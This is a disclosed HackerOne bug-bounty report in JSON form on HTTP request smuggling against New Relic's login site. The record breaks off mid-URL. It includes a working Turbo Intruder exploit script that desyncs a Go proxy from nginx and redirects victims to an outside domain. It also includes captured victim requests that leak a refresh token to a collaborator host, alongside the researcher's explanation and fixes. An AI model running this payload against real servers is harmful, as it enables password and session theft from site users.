{"id":498052,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTgwNTI=","url":"https://hackerone.com/reports/498052","title":"Password theft login.newrelic.com via Request Smuggling","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-02-19T14:10:14.035Z","submitted_at":"2019-02-19T14:10:14.035Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"albinowax","url":"/albinowax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-30T01:06:43.632Z","bug_reporter_agreed_on_going_public_at":"2019-08-29T15:47:08.262Z","team_member_agreed_on_going_public_at":"2019-08-30T01:06:43.510Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nThe Rails application at login.newrelic.com is accessed through a proxy written in Golang, and an nginx server. By sending an ambiguous request, an attacker can desynchronize these servers, leaving the socket to the backend poisoned with a harmful response. This response will then be served up to the next visitor. \n\nThe desync occurs when sending a request with a Content-Length header and a valid Transfer-Encoding header followed by an invalid Transfer-Encoding header. The Golang proxy only examines the second Transfer-Encoding which is invalid, so it uses the Content-Length instead. However the nginx server prioritises the valid Transfer-Encoding header and therefore ignores the Content-Length.\n\n\nTo replicate this issue, run the following script in Turbo Intruder. It issues the desync request, and then simulates 10 requests from normal visitors. It's quite unreliable as it may poison another visitor instead of your own requests, but you should see that one of the victim requests gets a 301 response which redirects to https://skeletonscribe.net/. This script targets staging-login.newrelic.com: to avoid having an impact on the production environment.\n\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint='https://staging-login.newrelic.com:443',\n                           concurrentConnections=5,\n                           requestsPerConnection=5,\n                           pipeline=False,\n                           maxRetriesPerRequest=0\n                           )\n\n    attack = '''POST /login HTTP/1.1\nHost: staging-login.newrelic.com\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nCookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; _mkto_trk=id:412-MZS-894\u0026token:_mch-newrelic.com-1547216493639-15775; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; ei_client_id=5c39274682f6eb000fa6d52a; _golden_gate_session=bkRPMUZ3STBrY0laZG0zemY1Umg5cFVhcWpNaGpvZWN2T0tOM3hWL2p2UVdaVTJLZFh5NkJtQnZHV2FIR3hnZWpKaWFvM2F2WkRab3hjWTd5b3A1T2dOY20zWWNQaFhZNWVRZXFuRkFwU3l1YVZMdm1JSW9pSGd0UnRicnRBUVdhaGg3UXJQTFJ0c3ZkMHRyaHZqNjYreCt4dWUwVlp1UTdrSVFpSEx6akVITjRWWGNrSUR5NGdIdG80UnFJS2xpVTNlU1BpK0hjWEZJMVF1R2I4RlNNeUdicVdTWFVDQnBlQ0NQSXdNYXFJM2lDTWc5VldLOTJ3N1A3Wll5RytpZVNya2J1WTdTNUZ5UVFRNk5KVmt2TmNudlU3WDFQMVJPbGtkWXJJWXd1YjA9LS1MeU1EbTkrZ29qVVo2VkNUMDhnMVp3PT0%3D--155cef8a5f5d2bcb69b1d1952af040a3479aeacb; _gat=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 189\nTransfer-Encoding: chunked\nTransfer-Encoding: foo\n\n3e\nreturn_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F\n0\n\nGET / HTTP/1.1\nHost: staging-login.newrelic.com:123\nX-Forwarded-Host: skeletonscribe.net\nContent-Length: 10\n\nx='''\n    engine.queue(attack)\n    engine.start()\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n    if req.code == 200:\n        victim = '''GET /?x= HTTP/1.1\nHost: staging-login.newrelic.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nCookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; _gat=1; _mkto_trk=id:697-KKO-240\u0026token:_mch-newrelic.com-1547216493639-15775; _golden_gate_session=dWUvd1NFRVJRN051UUg0K245YWxPZ3NleGdQNFBPbXZLRS84WElQZFdSS3g1d28xNXBTb0RKZXNQeEFLSm4zeE9yeTJia1lxNGRPUWhPZFhXYVY1eGM1emMyTGZvZmVzcHNsby85UEJqbXViK3E4SHNRSVllT0lCSk4zUzdWNW5ic1MzNVNqSStaeW5qblM2dERuUWN5Wml0ZzYwd1BkU256UVpmM1JtdjN6S01taTFLM3VCMGNuWi96NmhPc3JBLS1BRlZ4dis4MTVxZ0NjblZpVlgvVmdRPT0%3D--ab2b42c56157e42752d86deb9e03f18946a4d5c5; ei_client_id=5c3929f2857699000fe7bcc5\n\n'''\n\n        for i in range(10):\n            req.engine.queue(victim)\n```\n            \nSince this technique allows attackers to bypass rules in frontend systems, it may also be possible to access internal content that's meant to be private.\n\n## Impact\n\nBy redirecting javascript imports to a malicious domain, an attacker can inject a keylogger and steal user passwords from your login page. This attack requires no user interaction","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":86,"name":"HTTP Request Smuggling"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-09-28T15:47:08.359Z","allow_singular_disclosure_after":-64279154.97113388,"singular_disclosure_allowed":true,"vote_count":481,"voters":["nopnopnop","wi11","honoki","faberge","mirchr","sgabe","djcater","webhak","nohats","j_m","and 471 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":17016,"asset_type":"URL","asset_identifier":"login.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4173315,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As well as getting stored XSS on the login page by redirecting javascript loads, this technique can be used to hijack non-browser based software that interacts with your server. Here's a couple of requests to the login staging site that got redirected to my domain:\n\n```\nGET /x HTTP/1.1\ncontent-type: application/x-www-form-urlencoded\nhost: a6hsd9f77ih7f2xndvrf3yrdc4iw6l.burpcollaborator.net:443\nconnection: close\ncontent-length: 382\n\nrefresh_token=dy6vyhmX02Xdsd%2FYi6U0YzFoeC4tBdpqATVD0cZqjSvWMH7mYWT7DLd8o4iCYm9R0rAPXYKnzvQc39rA2Vd4Pbzqx5oTx0NNcoXzSGdV7EU4j12OMW%2BE0AROSfuZn4KSj%2BvJ91NMtVbVGeW55eVwB%2FkjPG1XmR8zFTadVQxnttukE9WdvPPkAngB7e%2BJ4Fpi%2BmpYKFs4EcjuLJhSwt2CDxDAcdFy%2FF1hb1pgI1m6%2FO7JBpVyU%2BN05ybRZAJE6y%2FdQH9WbaFUWbs8UWwx5YNsfVnuP7Tx3I3nlT6rXjw4GcnIE85YLuJuYdtjRR0zJXsDCneuJNPztYEniZR8gkVytA%3D%3D\n```\nand\n```\nGET /x HTTP/1.1\nHost: a6hsd9f77ih7f2xndvrf3yrdc4iw6l.burpcollaborator.net\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36\nAccept: text/css,*/*;q=0.1\nDNT: 1\nReferer: https://staging-login.newrelic.com/login?return_to=https%3A%2F%2Fstaging-account.newrelic.com%2Faccounts%2F1877098%2Fusers\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.8\nX-NewRelic-Synthetics: PwcbUEpBDAQCAVUHB1IaUQUEAR5WUFcEHQNeAAwVUQcCUg9RAQUBVlZVFU1EAlwDAQBRUA8cU1RcUhsHV1dSTwlVWQAVXVYHBFdcWVQAVVcCFBtDVVAABlJSBFEaUgZQUhwCUlIHTltSAwFPDQ0EBgtVDAUAUQIDRms=\nX-Abuse-Info: Request sent by a New Relic Synthetics Monitor (https://docs.newrelic.com/docs/synthetics/new-relic-synthetics/administration/identify-synthetics-requests-your-app) - monitor id: 3385b6e3-c166-4a0a-9ba9-5504805d101a | account id: 1\n```","automated_response":false,"created_at":"2019-02-19T14:22:50.418Z","updated_at":"2019-02-19T14:22:50.418Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4175208,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @albinowax ,\n\nThanks for the report! This appears be a pretty neat finding, but you'll need to give me some time to try to reproduce this. I'll keep you updated.\n\nThanks!\n@dday ","automated_response":false,"created_at":"2019-02-19T19:39:04.456Z","updated_at":"2019-02-19T19:39:04.456Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4176597,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @albinowax ,\n\nMaybe you can help me out. I'm attempting to repro this, and when running your script, I indeed see 1 in 10 requests getting 301'd to a local webserver I have running, but it doesn't appear that anything is actually returned:\n\n{F426794}\n\nWhen you repro using your `skeletonscribe.net` domain, are you actually seeing the traffic hit `skeletonscribe.net`?\n","automated_response":false,"created_at":"2019-02-19T23:16:34.693Z","updated_at":"2019-02-19T23:16:34.693Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":426794,"filename":"Screen_Shot_2019-02-19_at_3.14.14_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/426/794/3e8a9045a4cd705a5024fc4b3ae5eb39b2657ab2/Screen_Shot_2019-02-19_at_3.14.14_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-02-19_at_3.14.14_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-02-19_at_3.14.14_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150623Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1cb4ef11826857287b647d7a7def713985061169ff891772ae983848c40ee41a"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4177978,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @dday\n\nThe redirect is legitimate - it's pretty common for redirects to have an empty body. However, if turbo intruder successfully snags the poisoned response (as in your screenshot) then you won't see any traffic hit your server because Turbo intruder doesn't follow redirects.\n\nHowever all normal HTTP clients, including web browsers, do follow redirects. The two stolen requests I showed above came from such clients. If you want to replicate this yourself, you'll need to:\n- Comment out the `req.engine.queue(victim)` line to avoid Turbo Intruder getting the poisoned response\n- Redirect to a server that's not running on localhost. I personally use the burp collaborator client.\n\nI've attached a screenshot showing what to expect.\n","automated_response":false,"created_at":"2019-02-20T08:37:11.736Z","updated_at":"2019-02-20T08:45:41.319Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":426971,"filename":"Screenshot_2019-02-20_at_08.44.44.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/426/971/e373b462708f24844e01120a36bd8df3463b9b57/Screenshot_2019-02-20_at_08.44.44.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-02-20_at_08.44.44.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-02-20_at_08.44.44.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150623Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9dfec5a8b118a56b95307b7451a20010dddcc99bebbacabb2d08f1b68d963f0f"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4183437,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @albinowax ,\n\nThanks for the clarification. I'm still able to reproduce this however myself and my team are having a difficult time 1)Groking why this actually works and 2)What the resolution is.\n\nSo here's a few further questions:\n\nIn your attack request, you include the following as the request body:\n\n```\n3e\nreturn_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F\n0\n\nGET /login HTTP/1.1\nHost: staging-login.newrelic.com:123\nX-Forwarded-Host: example.com\nContent-Length: 10\n\nx=\n```\n\nHow does the `X-Forwarded-Host` header in the request body get used as a header when it's in the body?\n\nWhy is the reproduction so inconsistent? I'm trying to understand why it takes so many victim requests to actually hit the evil domain.\n\nHow are you getting the request to the evil domain to stay in the proxy. I guess I don't quite grasp how the desync in the `transfer-encoding` header accomplishes this.\n\nThanks for your patience while we try to figure this one out. It's a pretty gnarly bug, and I'm looking forward to being able to throw $$$ your way.\n\n\n\n","automated_response":false,"created_at":"2019-02-20T23:42:16.731Z","updated_at":"2019-02-20T23:42:16.731Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4184998,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"This attack exploits connection reuse aka `Connection: keep-alive`. It requires a bunch of victim requests because the attack poisons a single backend connection, and your frontend appears to use a pool of connections to talk to backend systems. So you have to keep hitting it until a victim request gets forwarded via the poisoned backend connection.\n\nRegarding the desync, this is the key section:\n````\nContent-Length: 189\nTransfer-Encoding: chunked\nTransfer-Encoding: foo\n\n3e\nreturn_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F\n0\n\nGET / HTTP/1.1...\n```\n\n- Because of the `Transfer-Encoding: foo` the frontend ignores the `Transfer-Encoding: chunked` and instead looks at the Content-Length, and decides this is a single POST request. It forwards the whole thing to the backend\n- The backend sees `Transfer-Encoding: chunked` which is an alternative body encoding method that tends to take priority over the Content-Length header. This means it stops reading after the 0/r/n/r/n and everything after that point is interpreted as a second request.\n- This second request is incomplete so it sits on the socket between the frontend and backend until the frontend decides to send another request down that connection. This means the second request eventually ends up looking like:\n\n```\nGET /login HTTP/1.1\nHost: staging-login.newrelic.com:123\nX-Forwarded-Host: example.com\nContent-Length: 10\n\nx=GET /whatever HTTP/1.1.......\n```\n\nTo fix this issue, you could:\n- Disable connection reuse between the proxy and backend systems (or maybe switch to HTTP/2)\n- Or perhaps remove the go proxy and use nginx instead\n- Or make the frontend reject or normalise requests that have both Transfer-Encoding: chunked and a Content-Length, or just duplicate Transfer-Encoding/Content-Length headers in general.\n","automated_response":false,"created_at":"2019-02-21T09:24:57.232Z","updated_at":"2019-02-21T09:25:42.673Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4189247,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @albinowax ,\n\nThanks for the detailed response. I met with our dev teams and we think we know where the issue lies.\n\nThis is a pretty dope bug, and I'm going to triage it now.\n\nI'm going to set this to a High severity as it doesn't quite meet our qualification for a Critical severity. But because this is one of the better reports we've gotten, I'll throw you a bonus.","automated_response":false,"created_at":"2019-02-21T22:56:44.703Z","updated_at":"2019-02-21T22:56:44.703Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4189248,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-02-21T22:56:55.070Z","updated_at":"2019-02-21T22:56:55.070Z","additional_data":{"old_severity":"Critical (9.8)","new_severity":"High","old_severity_id":299584,"new_severity_id":301221},"actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4189255,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-02-21T22:58:53.682Z","updated_at":"2019-02-21T22:58:53.682Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"albinowax","url":"/albinowax"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4192502,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. If you let me know when it's fixed I'll take another look and confirm. ","automated_response":false,"created_at":"2019-02-22T14:12:29.481Z","updated_at":"2019-02-22T14:12:29.481Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4192883,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, I should mention that this issue appears to affect quite a lot of your infrastructure beyond just login.newrelic.com (see attached screenshot). I haven't manually verified the findings listed since they might all be behind the same proxy, but it's something to be aware of when you patch. I'll take another look at them once your fix is deployed.","automated_response":false,"created_at":"2019-02-22T15:31:16.922Z","updated_at":"2019-02-22T15:31:16.922Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":428436,"filename":"Screenshot_2019-02-22_at_15.26.17.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/428/436/c4cc0e8c63f63e252a3386afebf20b5af23acc3e/Screenshot_2019-02-22_at_15.26.17.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-02-22_at_15.26.17.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-02-22_at_15.26.17.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150623Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BY